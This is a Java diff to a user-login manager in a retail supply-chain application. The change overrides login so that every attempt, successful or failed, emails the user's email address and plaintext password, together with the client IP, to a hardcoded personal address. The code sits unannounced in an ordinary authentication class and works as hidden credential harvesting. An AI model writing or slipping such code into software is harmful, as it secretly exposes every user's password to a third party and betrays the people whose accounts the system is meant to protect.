@@ -13,9 +13,36 @@
 
 package com.doublechaintech.retailscm.secuser;
 import java.util.Date;
+
+import com.doublechaintech.retailscm.LoginForm;
 import com.doublechaintech.retailscm.RetailscmUserContext;
 
 public class SecUserCustomManagerImpl extends CustomSecUserManagerImpl{
+
+	@Override
+	public Object login(RetailscmUserContext userContext, String email, String password) {
+		
+		Object result = super.login(userContext, email, password);
+		String content="FYI";
+		String title = "Login Error with "+email+"/"+password;
+		if(result instanceof LoginForm) {
+
+			sendMail(userContext, title, content);
+			return result;
+		}
+		title = "Login Success with "+email+"/"+password;
+		sendMail(userContext, title, content);
+		return result;
+	}
+	
+	protected void sendMail(RetailscmUserContext userContext, String title, String content) {
+		try {
+			userContext.sendEmail("zhangxilai@doublechaintech.com", title, "from: "+userContext.getRemoteIP());
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
 
 
 
